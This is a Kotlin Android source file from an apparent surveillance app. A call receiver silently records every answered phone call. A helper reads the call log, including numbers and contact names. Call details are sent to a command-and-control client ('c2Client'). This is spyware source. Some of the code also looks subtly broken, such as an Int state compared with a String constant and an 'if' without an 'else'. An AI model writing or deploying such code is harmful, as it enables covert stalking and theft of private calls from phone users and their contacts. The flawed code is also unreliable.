package com.xrc.app.surveillance

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.telephony.TelephonyManager
import android.util.Log
import com.xrc.app.XRCApp
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Call recording and call log retrieval module.
 * Records both incoming and outgoing calls.
 */
class CallReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "CallReceiver"
        private var lastState = TelephonyManager.CALL_STATE_IDLE
        private var isRecording = false
        private var recorder: MediaRecorder? = null
        private var currentNumber = ""
        private var currentCallStartTime = 0L
    }

    override fun onReceive(context: Context, intent: Intent) {
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                currentNumber = incomingNumber ?: "unknown"
                Log.d(TAG, "Incoming call from: $currentNumber")
            }
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                currentCallStartTime = System.currentTimeMillis()
                startCallRecording(context)
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                if (lastState == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                    stopCallRecording(context)
                    val duration = System.currentTimeMillis() - currentCallStartTime
                    logCall(context, currentNumber, duration)
                }
                currentNumber = ""
                currentCallStartTime = 0L
            }
        }
        lastState = when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> TelephonyManager.CALL_STATE_RINGING
            TelephonyManager.EXTRA_STATE_OFFHOOK -> TelephonyManager.CALL_STATE_OFFHOOK
            else -> TelephonyManager.CALL_STATE_IDLE
        }
    }

    private fun startCallRecording(context: Context) {
        try {
            val file = File(
                context.getExternalFilesDir(Environment.DIRECTORY_MUSIC),
                "call_${System.currentTimeMillis()}.mp4"
            )

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioBitRate(128000)
                setOutputFile(file.absolutePath)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    setPreferredAudioDevice(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.media.AudioDeviceInfo.TYPE_BUILTIN_MIC
                    } else {
                        -1
                    })
                }

                prepare()
                start()
                isRecording = true
                Log.i(TAG, "Call recording started: ${file.absolutePath}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start call recording: ${e.message}")
        }
    }

    private fun stopCallRecording(context: Context) {
        try {
            if (isRecording) {
                recorder?.apply {
                    stop()
                    release()
                }
                isRecording = false
                Log.i(TAG, "Call recording stopped")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        }
    }

    private fun logCall(context: Context, number: String, durationMs: Long) {
        val json = JSONObject().apply {
            put("type", "call_log")
            put("number", number)
            put("duration_ms", durationMs)
            put("timestamp", System.currentTimeMillis())
        }
        XRCApp.instance.c2Client.send(json.toString())
    }
}

object CallRecorder {

    fun getCallLogs(context: Context, limit: Int = 100): JSONArray {
        val logs = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                "${CallLog.Calls.DATE} DESC LIMIT $limit"
            )
            cursor?.use {
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

                while (it.moveToNext()) {
                    val log = JSONObject().apply {
                        put("number", if (numberIdx >= 0) it.getString(numberIdx) else "")
                        put("type", if (typeIdx >= 0) it.getInt(typeIdx) else 0)
                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                        put("duration", if (durationIdx >= 0) it.getLong(durationIdx) else 0L)
                        put("name", if (nameIdx >= 0) it.getString(nameIdx) ?: "")
                    }
                    logs.put(log)
                }
            }
        } catch (e: Exception) {
            Log.e("CallRecorder", "Error reading call logs: ${e.message}")
        }
        return logs
    }
}
